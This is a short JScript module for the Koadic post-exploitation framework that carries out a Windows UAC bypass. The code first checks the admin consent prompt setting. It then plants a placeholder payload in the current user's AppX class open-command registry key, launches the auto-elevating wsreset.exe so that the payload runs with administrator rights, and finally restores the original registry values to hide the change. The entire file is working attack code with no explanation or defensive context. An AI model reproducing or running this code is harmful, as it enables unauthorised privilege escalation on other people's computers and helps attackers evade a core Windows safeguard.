try
{
    var consentpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    var consentval = Koadic.registry.read(Koadic.registry.HKLM, consentpath, "ConsentPromptBehaviorAdmin", Koadic.registry.DWORD).uValue;
    if (consentval == 2)
    {
        var e = Error('Consent value is too high!');
        throw e;
    }

    var path = "Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command";
    var delegate = Koadic.registry.read(Koadic.registry.HKCU, path, 'DelegateExecute', Koadic.registry.STRING).SValue;
    Koadic.registry.write(Koadic.registry.HKCU, path, 'DelegateExecute', '', Koadic.registry.STRING);
    Koadic.registry.write(Koadic.registry.HKCU, path, '', '~PAYLOAD_DATA~', Koadic.registry.STRING);

    Koadic.shell.run("C:\\Windows\\System32\\wsreset.exe", false);

    Koadic.work.report("Completed");

    Koadic.registry.write(Koadic.registry.HKCU, path, 'DelegateExecute', delegate, Koadic.registry.STRING);
    Koadic.registry.write(Koadic.registry.HKCU, path, '', '', Koadic.registry.STRING);
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
